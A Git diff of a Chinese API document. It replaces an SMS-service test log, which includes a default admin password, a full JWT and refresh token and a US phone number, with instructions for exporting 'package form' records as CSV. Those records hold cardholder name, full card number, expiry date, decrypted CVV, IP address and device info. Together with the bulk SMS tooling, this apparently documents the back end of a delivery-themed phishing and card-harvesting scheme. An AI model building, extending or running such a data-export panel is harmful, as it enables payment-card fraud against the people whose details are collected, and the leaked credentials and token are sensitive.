@@ -1,455 +1,151 @@
-# Buka短信服务测试结果记录
+# 包裹表单数据导出接口使用说明
 
-## 1. 登录获取Token
+## 接口概述
 
-**请求：**
+该接口用于按日期导出包裹表单数据，将以 CSV 格式返回指定日期创建的所有表单记录。
 
-```bash
-curl -X POST http://localhost:3000/v1/system/auth/login -H "Content-Type: application/json" -d '{"username": "admin", "password": "admin123", "rememberMe": true}' | jq
-```
+- **接口路径**: `GET /v1/pkgform/derived`
+- **认证要求**: 需要 JWT 认证（Bearer Token）
+- **返回格式**: CSV 文件
 
-**响应：**
+## 请求参数
 
-```json
-{
-  "code": 0,
-  "message": "success",
-  "data": {
-    "id": "2",
-    "accessToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEsInVzZXJJZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGVzIjpbImFkbWluIl0sInRlbmFudElkIjoxLCJjbGllbnRJZCI6IndlYiIsImp0aSI6IjBhYzhmODQxLWY2MWEtNDdiZi1iMDc2LWY1ZTYyMDZiOWU3NSIsImlhdCI6MTc0NDIyODk1NCwiZXhwIjoxNzQ0MjMyNTU0LCJpc3MiOiJzbXMtc2VydmUifQ.lpJSZFsAsRipGK4syUIZgv2yTzzjYp-pjBeYog3sKS4",
-    "refreshToken": "0ac8f841-f61a-47bf-b076-f5e6206b9e75",
-    "userId": 1,
-    "userType": 1,
-    "clientId": "web",
-    "expiresTime": 1744232554,
-    "sessionId": "5c50b31b-816b-4904-9cc7-02e814837a25",
-    "tenantId": 1
-  }
-}
-```
+| 参数名 | 类型   | 必填 | 说明                        | 示例       |
+| ------ | ------ | ---- | --------------------------- | ---------- |
+| date   | string | 是   | 查询日期，格式为 YYYY-MM-DD | 2023-10-25 |
 
-## 2. 查询短信模板列表（初始状态）
+## 响应格式
 
-**请求：**
+接口将直接返回 CSV 文件，文件命名格式为 `package-forms-{日期}.csv`。
 
-```bash
-curl -X GET "http://localhost:3000/v1/template/sms/list" -H "Authorization: Bearer $TOKEN" | jq
-```
+CSV 文件包含以下列：
 
-**响应：**
+- ID
+- Name (姓名)
+- Address1 (地址行1)
+- Address2 (地址行2)
+- City (城市)
+- State (州/省)
+- PostalCode (邮政编码)
+- Email (邮箱)
+- Phone (电话)
+- Cardholder (持卡人)
+- CardNumber (卡号，已解密)
+- ExpireDate (到期日)
+- CVV (安全码，已解密)
+- IPAddress (IP地址)
+- DeviceInfo (设备信息)
+- CreatedAt (创建时间)
 
-```json
-{
-  "code": 0,
-  "message": "success",
-  "data": []
-}
-```
+## 前端调用示例
 
-## 3. 创建短信模板
+### JavaScript (Fetch API)
 
-**请求：**
+```javascript
+// 导出函数
+async function exportPackageFormsByDate(date) {
+  try {
+    // 获取认证令牌
+    const token = localStorage.getItem('auth_token'); // 根据实际存储方式调整
 
-```bash
-curl -X POST "http://localhost:3000/v1/template/sms/create" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"name": "美国测试模板", "content": "您的验证码是：{code}，请在5分钟内使用。", "providerTemplateId": "SMS_TEST_001", "variables": ["code"]}' | jq
-```
+    // 创建URL，添加日期参数
+    const url = `/v1/pkgform/derived?date=${date}`;
 
-**响应：**
-
-```json
-{
-  "code": 0,
-  "message": "success",
-  "data": {
-    "id": 2,
-    "userId": 1,
-    "tenantId": 1,
-    "name": "美国测试模板",
-    "content": "您的验证码是：{code}，请在5分钟内使用。",
-    "providerTemplateId": "SMS_TEST_001",
-    "variables": ["code"],
-    "createTime": "2025-04-09T12:05:26.000Z",
-    "updateTime": "2025-04-09T12:05:26.000Z",
-    "user": {
-      "id": 1,
-      "username": "admin",
-      "email": null,
-      "role": "admin",
-      "isActive": true,
-      "tenantId": 1,
-      "tenant": {
-        "id": 1,
-        "name": "PNS",
-        "code": "pns",
-        "website": null,
-        "contactEmail": null,
-        "contactPhone": null,
-        "logoUrl": null,
-        "status": "active",
-        "expirationDate": null,
-        "createTime": "2025-04-09T11:48:35.000Z",
-        "updateTime": "2025-04-09T11:48:35.000Z"
+    // 发送请求
+    const response = await fetch(url, {
+      method: 'GET',
+      headers: {
+        Authorization: `Bearer ${token}`,
       },
-      "createTime": "2025-04-09T11:48:35.000Z",
-      "updateTime": "2025-04-09T11:48:35.000Z"
+    });
+
+    if (!response.ok) {
+      throw new Error(`导出失败: ${response.statusText}`);
     }
-  }
-}
-```
 
-## 4. 查询更新后的短信模板列表
-
-**请求：**
-
-```bash
-curl -X GET "http://localhost:3000/v1/template/sms/list" -H "Authorization: Bearer $TOKEN" | jq
-```
-
-**响应：**
-
-```json
-{
-  "code": 0,
-  "message": "success",
-  "data": [
-    {
-      "id": 2,
-      "userId": 1,
-      "tenantId": 1,
-      "name": "美国测试模板",
-      "content": "您的验证码是：{code}，请在5分钟内使用。",
-      "providerTemplateId": "SMS_TEST_001",
-      "variables": ["code"],
-      "createTime": "2025-04-09T12:05:26.000Z",
-      "updateTime": "2025-04-09T12:05:26.000Z",
-      "user": {
-        "id": 1,
-        "username": "admin",
-        "email": null,
-        "role": "admin",
-        "isActive": true,
-        "tenantId": 1,
-        "tenant": {
-          "id": 1,
-          "name": "PNS",
-          "code": "pns",
-          "website": null,
-          "contactEmail": null,
-          "contactPhone": null,
-          "logoUrl": null,
-          "status": "active",
-          "expirationDate": null,
-          "createTime": "2025-04-09T11:48:35.000Z",
-          "updateTime": "2025-04-09T11:48:35.000Z"
-        },
-        "createTime": "2025-04-09T11:48:35.000Z",
-        "updateTime": "2025-04-09T11:48:35.000Z"
-      }
-    },
-    {
-      "id": 1,
-      "userId": 1,
-      "tenantId": 1,
-      "name": "123",
-      "content": "123",
-      "providerTemplateId": "SMS_1744229117897_996",
-      "variables": [],
-      "createTime": "2025-04-09T12:05:18.000Z",
-      "updateTime": "2025-04-09T12:05:18.000Z",
-      "user": {
-        "id": 1,
-        "username": "admin",
-        "email": null,
-        "role": "admin",
-        "isActive": true,
-        "tenantId": 1,
-        "tenant": {
-          "id": 1,
-          "name": "PNS",
-          "code": "pns",
-          "website": null,
-          "contactEmail": null,
-          "contactPhone": null,
-          "logoUrl": null,
-          "status": "active",
-          "expirationDate": null,
-          "createTime": "2025-04-09T11:48:35.000Z",
-          "updateTime": "2025-04-09T11:48:35.000Z"
-        },
-        "createTime": "2025-04-09T11:48:35.000Z",
-        "updateTime": "2025-04-09T11:48:35.000Z"
+    // 获取文件名
+    const contentDisposition = response.headers.get('content-disposition');
+    let filename = `package-forms-${date}.csv`;
+    if (contentDisposition) {
+      const filenameMatch = contentDisposition.match(/filename="(.+)"/);
+      if (filenameMatch) {
+        filename = filenameMatch[1];
       }
     }
-  ]
-}
-```
 
-## 5. 发送短信
+    // 将响应转换为blob
+    const blob = await response.blob();
 
-**请求：**
+    // 创建下载链接
+    const downloadUrl = window.URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = downloadUrl;
+    a.download = filename;
+    document.body.appendChild(a);
+    a.click();
+    window.URL.revokeObjectURL(downloadUrl);
+    a.remove();
 
-```bash
-curl -X POST "http://localhost:3000/v1/notification/sms" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"providerId": 1, "recipients": ["3392427816"], "countryCode": "US", "content": "您的验证码是123456，5分钟内有效", "templateId": 2, "variables": {"code": "123456"}}' | jq
-```
-
-**响应：**
-
-```json
-{
-  "code": 0,
-  "message": "success",
-  "data": {
-    "id": "1",
-    "userId": 1,
-    "name": "SMS Batch 2025-04-09T20:08:46.660Z",
-    "status": "pending",
-    "templateId": 2,
-    "templateParams": {
-      "code": "123456"
-    },
-    "processingStartedAt": null,
-    "createTime": "2025-04-09T12:08:46.000Z",
-    "updateTime": "2025-04-09T12:08:46.000Z",
-    "contentType": "template",
-    "directContent": null,
-    "processedCount": 0,
-    "successCount": 0,
-    "failureCount": 0,
-    "processingCompletedAt": null,
-    "providerId": 1,
-    "recipientNumbers": "3392427816",
-    "totalRecipients": 1
+    return true;
+  } catch (error) {
+    console.error('导出表单数据失败:', error);
+    throw error;
   }
 }
 ```
 
-## 6. 查询批次详情
+### 使用示例
 
-**请求：**
+```javascript
+// 日期选择器改变事件
+document.getElementById('datePicker').addEventListener('change', async (e) => {
+  const selectedDate = e.target.value; // 格式为YYYY-MM-DD
 
-```bash
-curl -X GET "http://localhost:3000/v1/notification/sms/batches/1" -H "Authorization: Bearer $TOKEN" | jq
-```
+  try {
+    // 显示加载状态
+    showLoading('正在导出数据...');
 
-**响应：**
+    // 调用导出函数
+    await exportPackageFormsByDate(selectedDate);
 
-```json
-{
-  "code": 0,
-  "message": "success",
-  "data": {
-    "id": "1",
-    "userId": 1,
-    "name": "SMS Batch 2025-04-09T20:08:46.660Z",
-    "status": "completed",
-    "contentType": "template",
-    "templateId": "2",
-    "totalRecipients": 1,
-    "processedCount": 0,
-    "successCount": 0,
-    "failureCount": 0,
-    "createTime": "2025-04-09T12:08:46.000Z",
-    "updateTime": "2025-04-09T12:08:47.000Z",
-    "directContent": null,
-    "templateParams": {
-      "code": "123456"
-    },
-    "providerId": "1",
-    "recipientNumbers": "3392427816",
-    "messages": [
-      {
-        "id": "1",
-        "batchId": "1",
-        "recipientNumber": "13392427816",
-        "status": "sent",
-        "providerMessageId": "6504100408461579488",
-        "errorMessage": null,
-        "sendTime": "2025-04-09T20:08:48.000Z",
-        "statusUpdateTime": null,
-        "createTime": "2025-04-09T12:08:46.000Z",
-        "updateTime": "2025-04-09T12:08:47.000Z"
-      }
-    ]
+    // 显示成功消息
+    showSuccess('数据导出成功');
+  } catch (error) {
+    // 显示错误消息
+    showError(`导出失败: ${error.message}`);
+  } finally {
+    // 隐藏加载状态
+    hideLoading();
   }
-}
-```
+});
 
-## 7. 刷新批次状态
+// 或者导出按钮点击事件
+document.getElementById('exportBtn').addEventListener('click', async () => {
+  const datePicker = document.getElementById('datePicker');
+  const selectedDate = datePicker.value;
 
-**请求：**
-
-```bash
-curl -X POST "http://localhost:3000/v1/notification/sms/batches/1/refresh" -H "Authorization: Bearer $TOKEN" | jq
-```
-
-**响应：**
-
-```json
-{
-  "code": 0,
-  "message": "success",
-  "data": {
-    "id": "1",
-    "userId": 1,
-    "name": "SMS Batch 2025-04-09T20:08:46.660Z",
-    "status": "completed",
-    "contentType": "template",
-    "templateId": "2",
-    "totalRecipients": 1,
-    "processedCount": 0,
-    "successCount": 0,
-    "failureCount": 0,
-    "createTime": "2025-04-09T12:08:46.000Z",
-    "updateTime": "2025-04-09T12:08:47.000Z",
-    "directContent": null,
-    "templateParams": {
-      "code": "123456"
-    },
-    "providerId": "1",
-    "recipientNumbers": "3392427816",
-    "messages": [
-      {
-        "id": "1",
-        "batchId": "1",
-        "recipientNumber": "13392427816",
-        "status": "sent",
-        "providerMessageId": "6504100408461579488",
-        "errorMessage": null,
-        "sendTime": "2025-04-09T20:08:48.000Z",
-        "statusUpdateTime": "2025-04-09T20:09:20.000Z",
-        "createTime": "2025-04-09T12:08:46.000Z",
-        "updateTime": "2025-04-09T12:09:19.000Z"
-      }
-    ]
+  if (!selectedDate) {
+    showError('请先选择日期');
+    return;
   }
-}
-```
 
-## 8. 查询批次状态详情（使用status API）
-
-**请求：**
-
-```bash
-curl -X GET "http://localhost:3000/v1/status/sms/batch/1" -H "Authorization: Bearer $TOKEN" | jq
-```
-
-**响应：**
-
-```json
-{
-  "code": 0,
-  "message": "success",
-  "data": {
-    "id": "1",
-    "userId": 1,
-    "name": "SMS Batch 2025-04-09T20:08:46.660Z",
-    "status": "completed",
-    "templateId": "2",
-    "templateParams": {
-      "code": "123456"
-    },
-    "processingStartedAt": null,
-    "createTime": "2025-04-09T12:08:46.000Z",
-    "updateTime": "2025-04-09T12:08:47.000Z",
-    "contentType": "template",
-    "directContent": null,
-    "processedCount": 0,
-    "successCount": 0,
-    "failureCount": 0,
-    "processingCompletedAt": "2025-04-09T20:08:48.000Z",
-    "providerId": "1",
-    "recipientNumbers": "3392427816",
-    "totalRecipients": 1
+  try {
+    showLoading('正在导出数据...');
+    await exportPackageFormsByDate(selectedDate);
+    showSuccess('数据导出成功');
+  } catch (error) {
+    showError(`导出失败: ${error.message}`);
+  } finally {
+    hideLoading();
   }
-}
+});
 ```
 
-## 9. 查询批次消息详情
+## 注意事项
 
-**请求：**
-
-```bash
-curl -X GET "http://localhost:3000/v1/status/sms/batch/1/messages" -H "Authorization: Bearer $TOKEN" | jq
-```
-
-**响应：**
-
-```json
-{
-  "code": 0,
-  "message": "success",
-  "data": {
-    "meta": {
-      "pageNo": 1,
-      "limit": 20,
-      "total": 1,
-      "pages": 1,
-      "hasNext": false,
-      "hasPrev": false
-    },
-    "items": [
-      {
-        "id": "1",
-        "batchId": "1",
-        "providerId": 1,
-        "recipientNumber": "13392427816",
-        "status": "sent",
-        "providerMessageId": "6504100408461579488",
-        "errorMessage": null,
-        "sendTime": "2025-04-09T20:08:48.000Z",
-        "statusUpdateTime": "2025-04-09T20:09:20.000Z",
-        "createTime": "2025-04-09T12:08:46.000Z",
-        "updateTime": "2025-04-09T12:09:19.000Z"
-      }
-    ]
-  }
-}
-```
-
-## 10. 查询所有短信批次
-
-**请求：**
-
-```bash
-curl -X GET "http://localhost:3000/v1/notification/sms/batches" -H "Authorization: Bearer $TOKEN" | jq
-```
-
-**响应：**
-
-```json
-{
-  "code": 0,
-  "message": "success",
-  "data": {
-    "list": [
-      {
-        "id": "1",
-        "userId": 1,
-        "name": "SMS Batch 2025-04-09T20:08:46.660Z",
-        "status": "completed",
-        "contentType": "template",
-        "templateId": "2",
-        "totalRecipients": 1,
-        "processedCount": 0,
-        "successCount": 0,
-        "failureCount": 0,
-        "createTime": "2025-04-09T12:08:46.000Z",
-        "updateTime": "2025-04-09T12:08:47.000Z"
-      }
-    ],
-    "total": 1
-  }
-}
-```
-
-## 测试结果总结
-
-1. **登录认证**：成功获取Token并后续用于API认证
-2. **模板管理**：成功创建短信模板并检索模板列表
-3. **短信发送**：成功向美国号码3392427816发送短信
-4. **批次查询**：批次状态从"pending"正确更新为"completed"
-5. **消息查询**：成功查询到消息状态为"sent"，并包含Buka的providerMessageId
-6. **状态刷新**：成功通过refresh接口更新批次状态的最新情况
-7. **批次列表**：成功获取所有已发送的批次列表
-
-测试验证了整个短信发送流程工作正常，包括批次创建、发送和状态查询功能。
+1. 导出时会查询用户在该日期（0点到24点之间）创建的所有表单数据
+2. 如果该日期没有数据，将返回仅包含表头的空CSV文件
+3. 敏感信息（如卡号、CVV）已在返回时解密，无需前端额外处理
+4. CSV格式适合直接在Excel或其他电子表格软件中打开
+5. 文件下载后，建议提醒用户妥善保管，因为包含敏感信息
+6. 接口受JWT认证保护，确保用户只能导出自己的数据
